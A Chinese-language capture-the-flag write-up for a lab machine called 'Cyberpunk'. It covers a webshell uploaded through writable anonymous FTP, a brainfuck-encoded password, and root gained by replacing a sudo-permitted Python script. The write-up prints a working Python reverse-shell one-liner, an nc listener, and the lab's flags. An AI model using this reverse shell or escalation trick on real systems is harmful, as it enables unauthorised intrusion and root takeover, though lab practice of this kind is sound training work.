# Cyberpunk

2025.03.08 https://thehackerslabs.com/cyberpunk/

[video](https://www.bilibili.com/video/BV1fa9QYnESV/?spm_id_from=333.1387.homepage.video_card.click&vd_source=aed2f374c732513d2e535afafb1fd2ec)

## Ip

192.168.5.39

## Scan

```
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

ftp 可匿名并有写权限，secret.txt 显示信息。发现 ftp 目录中的信息在 80 web 上显示，并且 ftp 有写权限，直接上传 webshell。

得到 web shell 后，进行系统枚举：

```
www-data@Cyberpunk:/$ cat opt/arasaka.txt
++++++++++[>++++++++++>++++++++++++>++++++++++>++++++++++>+++++++++++>+++++++++++>++++++++++++>+++++++++++>+++++++++++>+++++>+++++>++++++<<<<<<<<<<<<-]>-.>+.>--.>+.>++++.>++.>---.>.>---.>.>--.>-----..
```

brainfuck 解码得到 cyberpunk2077 ， 应该是 arasaka 的用户密码。

拿到 user flag：

```
arasaka@Cyberpunk:~$ cat user.txt
41311c28da287ef8acf6ad429c42c5d2
```

sudo -l 显示 (root) PASSWD: /usr/bin/python3.11 /home/arasaka/randombase64.py

目前对 /home/arasaka/randombase64.py 没有直接修改内容权限，但是这个文件在 arasaka 自身目录，可以将其删除，然后新建写入我们需要的执行命令：

```
cd
rm -f randombase64.py
echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.5.3",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' > randombase64.py
```

然后执行得到反弹 shell：

```
nc -lvnp 8888
sudo /usr/bin/python3.11 /home/arasaka/randombase64.py
```

读取到 root flag：

```
root@Cyberpunk:~# cat root.txt
344a4a8f53d36e7449957489701b040f

Enhorabuena, has podido desactivar el relic y salvar la vida de V.

La transferencia de eddies a tu cuenta se ha mandado :D
```
